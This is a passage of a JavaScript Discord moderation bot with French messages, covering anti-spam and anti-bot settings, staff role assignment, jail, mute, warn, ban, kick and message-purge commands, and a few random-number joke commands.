            config.antispamIntervalMs = ms;
            return message.reply(`✅ Fenêtre anti-spam réglée à **${args[1]}**.`);
        }
        if (sub === 'on' || sub === 'off') {
            config.antispam = (sub === 'on');
            return message.reply(`🛡️ Protection **Anti-Spam** réglée sur **${sub.toUpperCase()}** (Sanction : \`${config.antispamAction}\`)`);
        }
    }

    if (command === 'antibot') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'action') {
            const act = args[1]?.toLowerCase();
            const validActs = ['delete', 'warn', 'mute', 'kick', 'jail', 'bl', 'ban'];
            if (!validActs.includes(act)) return message.reply(`❌ Action invalide. Choix : \`${validActs.join(', ')}\``);
            config.antibotAction = act;
            return message.reply(`✅ Sanction Anti-Bot configurée sur l'inviteur : **${act.toUpperCase()}**`);
        }
        if (sub === 'on' || sub === 'off') {
            config.antibot = (sub === 'on');
            return message.reply(`🛡️ Protection **Anti-Bot** réglée sur **${sub.toUpperCase()}** (Sanction de l'inviteur : \`${config.antibotAction}\`)`);
        }
    }

    if (command === 'gay') {
        const target = message.mentions.users.first() || message.author;
        const percent = Math.floor(Math.random() * 101);
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🏳️‍🌈 Test Gay').setDescription(`**${target.username}** est à **${percent}%** gay !\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'iq') {
        const target = message.mentions.users.first() || message.author;
        const iq = Math.floor(Math.random() * 160) - 20;
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🧠 Test de QI').setDescription(`Le QI de **${target.username}** est estimé à **${iq}** !\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'owners') {
        const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Liste des Owners').setDescription(ownerList || "Aucun owner.")] });
    }

    if (command === 'owner') {
        if (!isSuperOwner(message)) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.add(targetUser.id);
        botOwners.add(targetUser.username.toLowerCase());
        return message.reply(`👑 **${targetUser.tag}** est désormais Owner !`);
    }

    if (command === 'admin') {
        if (!isSuperOwner(message)) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.admins.add(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** est désormais **Admin** du bot !`);
    }

    if (command === 'mod') {
        if (!isSuperOwner(message) && !isAdmin(message)) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.mods.add(targetUser.id);
        return message.reply(`🛡️ **${targetUser.tag}** est désormais **Modérateur** du bot !`);
    }
    const userIsAdmin = isAdmin(message);
    const userIsMod = isMod(message);
    const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || isOwner(message);

    const modCommands = ['clear', 'purge', 'snipe', 'slowmode', 'renew', 'createtext', 'createvoice', 'unmute', 'warn', 'warnings', 'mute'];
    const adminCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'lock', 'unlock', 'lockall', 'unlockall', 'jail', 'unjail', 'setlog', 'setmuterole', 'setwelcome', 'setticketpanel', 'setticketcat', 'setticketlog', 'settickettitle', 'setticketdesc', 'setticketimage', 'ticketadd', 'gcreate', 'gend', 'greroll', 'glist', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'addrole', 'delrole'];

    if (modCommands.includes(command)) {
        if (!userIsMod && !isUserAdminOrOwner) return message.reply("❌ Tu n'as pas assez de permissions (Réservé au Staff).");
    }

    if (adminCommands.includes(command)) {
        if (!userIsAdmin && !isUserOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Tu n'as pas assez de permissions (Réservé aux Administrateurs).");
        }
    }

    if (command === 'jail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        if (!targetMember) return message.reply("❌ Mentionne un membre valide.");

        try {
            const botRolePos = message.guild.members.me.roles.highest.position;
            const roleIds = targetMember.roles.cache.filter(r => r.id !== message.guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(targetMember.id, roleIds);
            if (roleIds.length > 0) await targetMember.roles.remove(roleIds).catch(() => {});

            const jailChannel = await message.guild.channels.create({
                name: `jail-${targetMember.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: message.guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: targetMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });

            await jailChannel.send({ content: `<@${targetMember.id}>`, embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔒 PRISON').setDescription(`Raison : ${reason}`)] });
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔒 Jail').setDescription(`**Admin :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Salon :** ${jailChannel}`).setTimestamp());
            return message.reply(`🔒 Membre envoyé en jail par un administrateur : ${jailChannel}`);
        } catch (e) { return message.reply("❌ Erreur jail."); }
    }

    if (command === 'unjail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre valide.");

        try {
            const savedRoles = jailDataMap.get(targetMember.id);
            if (savedRoles && savedRoles.length > 0) {
                await targetMember.roles.add(savedRoles).catch(() => {});
                jailDataMap.delete(targetMember.id);
            }
            const jailChan = message.guild.channels.cache.find(c => c.name === `jail-${targetMember.user.username.toLowerCase()}`);
            if (jailChan) await jailChan.delete().catch(() => {});
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unjail').setDescription(`**Admin :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}`).setTimestamp());
            return message.reply(`🔓 **${targetMember.user.tag}** libéré de la prison.`);
        } catch (e) { return message.reply("❌ Erreur unjail."); }
    }

    if (command === 'lock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔒 Salon verrouillé').setDescription(`Par Admin ${message.author.tag} dans <#${message.channel.id}>`).setTimestamp());
            return message.reply("🔒 Salon verrouillé par un administrateur.");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'unlock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Salon déverrouillé').setDescription(`Par Admin ${message.author.tag} dans <#${message.channel.id}>`).setTimestamp());
            return message.reply("🔓 Salon déverrouillé par un administrateur.");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'mute') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const durationStr = args[1];
        const reason = args.slice(2).join(' ') || "Aucune raison";

        if (!targetMember || !durationStr) return message.reply("❌ Utilisation : `=mute <@membre> <durée> [raison]`");
        const ms = parseDuration(durationStr);
        if (!ms) return message.reply("❌ Durée invalide (ex: 10s, 5m, 2h).");

        try {
            await targetMember.timeout(ms, reason);
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔇 Membre mute').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Durée :** ${durationStr}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`🔇 **${targetMember.user.tag}** a été mis en sourdine.`);
        } catch (e) { return message.reply("❌ Impossible de mute ce membre."); }
    }

    if (command === 'warn') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        
        let userWarns = warningsMap.get(targetMember.id) || [];
        userWarns.push({ reason, moderator: message.author.tag });
        warningsMap.set(targetMember.id, userWarns);

        sendLog(message.guild, new EmbedBuilder().setColor('#f39c12').setTitle('⚠️ Warn').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Raison :** ${reason}`).setTimestamp());
        return message.reply(`⚠️ Avertissement enregistré (${userWarns.length}).`);
    }

    if (command === 'ticketsetup') {
        return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: [getTicketDashboardRows()] });
    }
    if (command === 'setlog') {
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        return message.reply(`✅ Salon de logs globaux défini sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        return message.reply(`✅ Salon de bienvenue configuré !`);
    }

    if (command === 'gcreate') {
        const duration = args[0], winnersCount = parseInt(args[1]), prize = args.slice(2).join(' ');
        if (!duration || isNaN(winnersCount) || !prize) return message.reply("Utilisation : `=gcreate <durée> <gagnants> <prix>`");

        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle("🎉 GIVEAWAY 🎉").setDescription(`**Lot :** ${prize}\n**Gagnants :** ${winnersCount}`).setFooter({ text: `Par ${message.author.tag}` });
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success));
        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé !");
    }

    if (command === 'bl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await message.guild.members.ban(targetUser.id, { reason });
            sendLog(message.guild, new EmbedBuilder().setColor('#c0392b').setTitle('🔨 Ban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${targetUser.tag}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`🔨 **${targetUser.tag}** banni.`);
        } catch (e) { return message.reply("❌ Erreur ban."); }
    }

    else if (command === 'softbl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID valide.");
        try {
            await message.guild.members.ban(targetUser.id, { deleteMessageSeconds: 604800 });
            await message.guild.members.unban(targetUser.id);
            sendLog(message.guild, new EmbedBuilder().setColor('#e67e22').setTitle('🌪️ Softban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${targetUser.tag}`).setTimestamp());
            return message.reply(`🌪️ Softban effectué pour **${targetUser.tag}**.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'unbl') {
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("Donne l'ID à débannir.");
        try {
            const user = await client.users.fetch(userId);
            await message.guild.members.unban(userId);
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${user.tag}`).setTimestamp());
            return message.reply(`🔓 **${user.tag}** débanni.`);
        } catch (e) { return message.reply("❌ Introuvable."); }
    }

    else if (command === 'blist') {
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}** (\`${b.user.id}\`)`).slice(0, 15).join('\n') || "Aucun banni.";
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle("🔨 Bannissements").setDescription(banList)] });
    }

    else if (command === 'unbanall') {
        const bans = await message.guild.bans.fetch();
        if (bans.size === 0) return message.reply("Aucun banni.");
        for (const [id] of bans) await message.guild.members.unban(id).catch(() => {});
        sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unbanall').setDescription(`Par ${message.author.tag} (${bans.size} unbans)`).setTimestamp());
        return message.reply(`🔓 Tous les utilisateurs (${bans.size}) ont été débannis.`);
    }

    else if (command === 'kick') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un membre valide.");
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Membre introuvable.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await member.kick(reason);
            sendLog(message.guild, new EmbedBuilder().setColor('#e67e22').setTitle('👢 Kick').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetUser.tag}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`✅ **${targetUser.tag}** expulsé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'clear') {
        const count = parseInt(args[0]);
        if (isNaN(count) || count < 1 || count > 50) return message.reply("❌ Donne un nombre entre 1 et 50.");
        try {
            await message.delete();
            const fetched = await message.channel.messages.fetch({ limit: count });
            await message.channel.bulkDelete(fetched, true);
            const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { return message.reply("❌ Erreur suppression."); }
    }

    else if (command === 'purge') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Mentionne un membre à purger.");
        try {
            const fetched = await message.channel.messages.fetch({ limit: 100 });
            const userMsgs = fetched.filter(m => m.author.id === targetUser.id).first(30);
            if (userMsgs.length === 0) return message.reply("Aucun message trouvé.");
            await message.channel.bulkDelete(userMsgs, true);
            const conf = await message.channel.send(`🧹 ${userMsgs.length} messages purgés pour ${targetUser.tag}.`);
            setTimeout(() => conf.delete().catch(() => {}), 3000);
        } catch (e) { return message.reply("❌ Erreur purge."); }
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message récemment supprimé.");
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setAuthor({ name: sniped.author, iconURL: sniped.avatar }).setDescription(sniped.content).setFooter({ text: `Supprimé à ${sniped.time}` })] });
    }

    else if (command === 'slowmode') {
        const sec = parseInt(args[0]);
        if (isNaN(sec) || sec < 0 || sec > 21600) return message.reply("Donne un nombre entre 0 et 21600.");
        try {
            await message.channel.setRateLimitPerUser(sec);
            return message.reply(sec === 0 ? "⏱️ Mode lent désactivé." : `⏱️ Mode lent réglé sur ${sec}s.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'renew') {
        try {
            const pos = message.channel.position;
            const newChan = await message.channel.clone({ position: pos });
            await message.channel.delete();
            newChan.send("🔄 Salon régénéré avec succès !");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'createtext') {
        const name = args.join('-');
        if (!name) return message.reply("Donne un nom.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildText });
            return message.reply(`✅ Salon texte \`${name}\` créé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'createvoice') {
        const name = args.join(' ');
        if (!name) return message.reply("Donne un nom.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
            return message.reply(`✅ Salon vocal \`${name}\` créé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }
});

client.login(process.env.DISCORD_TOKEN);
